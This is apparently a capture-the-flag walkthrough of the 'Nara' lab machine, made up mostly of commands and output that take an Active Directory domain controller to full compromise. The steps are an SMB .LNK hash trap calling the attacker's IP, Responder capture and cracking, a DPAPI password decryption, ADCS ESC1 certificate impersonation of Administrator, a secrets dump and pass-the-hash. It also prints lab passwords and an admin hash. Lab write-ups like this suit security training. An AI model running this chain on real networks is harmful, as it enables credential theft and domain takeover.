@@ -1,0 +1,210 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.131.30 > nara.txt
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-29 01:58:19Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+|_ssl-date: 2026-06-29T01:59:53+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Nara.nara-security.com
+| Issuer: commonName=NARA-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T14:09:26
+| Not valid after:  2024-07-29T14:09:26
+| MD5:     fcef 5786 2def 642c 1d0a ade3 cda6 f5b2
+| SHA-1:   f7cf a4af d01d 617c b055 dcf8 aa34 3dce e897 5123
+|_SHA-256: fca4 c8f2 a8de 2e77 2247 d280 5567 0155 09a6 4c0d 093a f913 56cd 87b3 a6b2 2df9
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Nara.nara-security.com
+| Issuer: commonName=NARA-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T14:09:26
+| Not valid after:  2024-07-29T14:09:26
+| MD5:     fcef 5786 2def 642c 1d0a ade3 cda6 f5b2
+| SHA-1:   f7cf a4af d01d 617c b055 dcf8 aa34 3dce e897 5123
+|_SHA-256: fca4 c8f2 a8de 2e77 2247 d280 5567 0155 09a6 4c0d 093a f913 56cd 87b3 a6b2 2df9
+|_ssl-date: 2026-06-29T01:59:53+00:00; 0s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+|_ssl-date: 2026-06-29T01:59:53+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Nara.nara-security.com
+| Issuer: commonName=NARA-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T14:09:26
+| Not valid after:  2024-07-29T14:09:26
+| MD5:     fcef 5786 2def 642c 1d0a ade3 cda6 f5b2
+| SHA-1:   f7cf a4af d01d 617c b055 dcf8 aa34 3dce e897 5123
+|_SHA-256: fca4 c8f2 a8de 2e77 2247 d280 5567 0155 09a6 4c0d 093a f913 56cd 87b3 a6b2 2df9
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+|_ssl-date: 2026-06-29T01:59:53+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Nara.nara-security.com
+| Issuer: commonName=NARA-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T14:09:26
+| Not valid after:  2024-07-29T14:09:26
+| MD5:     fcef 5786 2def 642c 1d0a ade3 cda6 f5b2
+| SHA-1:   f7cf a4af d01d 617c b055 dcf8 aa34 3dce e897 5123
+|_SHA-256: fca4 c8f2 a8de 2e77 2247 d280 5567 0155 09a6 4c0d 093a f913 56cd 87b3 a6b2 2df9
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-06-29T01:59:53+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: NARASEC
+|   NetBIOS_Domain_Name: NARASEC
+|   NetBIOS_Computer_Name: NARA
+|   DNS_Domain_Name: nara-security.com
+|   DNS_Computer_Name: Nara.nara-security.com
+|   DNS_Tree_Name: nara-security.com
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-06-29T01:59:14+00:00
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Issuer: commonName=Nara.nara-security.com
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-06-28T01:55:59
+| Not valid after:  2026-12-28T01:55:59
+| MD5:     fb41 6e6f 0f96 3886 27d8 1ea7 6cd2 1b5d
+| SHA-1:   af20 2e01 6608 c79a 7f8c 7633 eec5 ff41 f561 a923
+|_SHA-256: 7217 04a4 0678 8e88 20ca 5628 d349 cffa 66fd 3b65 4ac6 ed0b b390 b8c5 197f 9f57
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49687/tcp open  msrpc         Microsoft Windows RPC
+49694/tcp open  msrpc         Microsoft Windows RPC
+49705/tcp open  msrpc         Microsoft Windows RPC
+49708/tcp open  msrpc         Microsoft Windows RPC
+49739/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: NARA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-06-29T01:59:18
+|_  start_date: N/A
+
+$ smbclient -L //192.168.131.30/ -N
+nara            Disk      company share
+Important.txt
+Documents                           D
+
+# Found smbshare writable. Generate a Malicious .LNK File with slinky
+nxc smb 192.168.131.30 -d nara-security.com -u 'guest' -p '' -M slinky -o NAME=test SERVER='192.168.45.218'
+
+# This create a test.lnk file in SMB share. Move it to Documents
+smb: \> rename test.lnk Documents\test.lnk
+
+$ sudo responder -I tun0 -wd
+[SMB] NTLMv2-SSP Client   : 192.168.131.30
+[SMB] NTLMv2-SSP Username : NARASEC\Tracy.White
+hash
+# Get user Tracy.White NTLMv2 hash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+zqwj041FGX       (Tracy.White)
+
+Tracy.White:zqwj041FGX
+
+$ nxc smb 192.168.131.30 -u Tracy.White -p zqwj041FGX
+SMB         192.168.131.30  445    NARA             [+] nara-security.com\Tracy.White:zqwj041FGX
+
+# BloodHound showed TRACY.WHITE has GenericAll permissions over the Remote Access group.
+
+$ net rpc group addmem "REMOTE ACCESS" "TRACY.WHITE" -U "nara-security.com"/"TRACY.WHITE"%"zqwj041FGX" -S "192.168.131.30"
+
+$ nxc winrm 192.168.131.30 -u Tracy.White -p zqwj041FGX
+WINRM       192.168.131.30  5985   NARA             [+] nara-security.com\Tracy.White:zqwj041FGX (Pwn3d!)
+$ evil-winrm -i 192.168.131.30 -u TRACY.WHITE -p 'zqwj041FGX'
+*Evil-WinRM* PS C:\Users\tracy.white\Documents> cat automation.txt
+Enrollment Automation Account
+
+01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b
+
+echo above to cred.txt
+# DPAPI Secrets & SecureString Decryption
+# Read the Encrypted Password
+
+$pw = Get-Content cred.txt | ConvertTo-SecureString
+
+    Get-Content cred.txt: Reads the contents of cred.txt, which is expected to store a securely saved password.
+
+    ConvertTo-SecureString: Converts the text into a secure string, meaning it’s protected in memory and cannot be easily accessed.
+
+2. Convert SecureString to a Pointer (Raw Memory)
+
+    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
+
+    SecureStringToBSTR($pw): Takes the secure string and converts it to an unmanaged BSTR (binary string) in memory.
+
+    This step is needed because secure strings are not directly readable as plaintext for security reasons.
+
+3. Extract Plaintext Password
+
+    $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
+
+    PtrToStringAuto($bstr): Converts the raw BSTR into a plaintext string.
+
+    This effectively decrypts the secure string, revealing the actual password in a readable format.
+
+4. Print the Password
+
+$UnsecurePassword
+hHO_S9gff7ehXw
+
+$ nxc smb 192.168.131.30 -u Tracy.White -p zqwj041FGX --users
+# Make a users list
+$ nxc smb 192.168.131.30 -u users -p hHO_S9gff7ehXw
+SMB         192.168.131.30  445    NARA             [+] nara-security.com\Jodie.Summers:hHO_S9gff7ehXw
+
+Jodie.Summers:hHO_S9gff7ehXw
+
+# Jodie.Summers is a member of the ENROLLMENT group. This likely means that Active Directory Certificate Services (ADCS) is enabled, and this user might have permission to request certificates — which can potentially be abused to escalate privileges.
+
+$ certipy-ad find -u 'jodie.summers' -p 'hHO_S9gff7ehXw' -dc-ip 192.168.131.30  -text -stdout -vulnerable
+[!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+      ESC4                              : User has dangerous permissions.
+# Request Certificate:
+$ certipy-ad req -u jodie.summers -p hHO_S9gff7ehXw -dc-ip 192.168.131.30 -ca 'NARA-CA' -template 'NaraUser' -upn 'administrator@nara-security.com' -debug
+# After requesting a certificate impersonating Administrator, tried to authenticate using certipy
+$ certipy-ad auth -pfx administrator.pfx  -u administrator -domain nara-security.com -dc-ip 192.168.131.30
+# used the -ldap-shell option to connect via LDAP using the same certificate. Added our compromised user to the Domain Admins group.
+# get_user_groups jodie.summers
+CN=Remote Management Users,CN=Builtin,DC=nara-security,DC=com
+CN=staff,CN=Users,DC=nara-security,DC=com
+CN=Remote Access,OU=remote,DC=nara-security,DC=com
+CN=Enrollment,CN=Users,DC=nara-security,DC=com
+
+# add_user_to_group jodie.summers Administrators
+Adding user: Jodie Summers to group Administrators result: OK
+# Even if Kerberos auth fails, LDAP authentication using the certificate can still work.
+This gives us an interactive shell to query and modify LDAP — useful for actions like adding users to groups or reading sensitive directory data.
+Now our Jodie.Summers user has the admin privelege.
+$ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.131.30 -ldap-shell
+impacket-secretsdump nara-security.com/jodie.summers:hHO_S9gff7ehXw@192.168.131.30
+
+$ evil-winrm -i 192.168.131.30 -u administrator -H 'd35c4ae45bdd10a4e28ff529a2155745'
+
+https://medium.com/@desp0/nara-proving-grounds-walkthrough-from-lnk-trap-to-domain-admin-08f1f4c80910
+
+
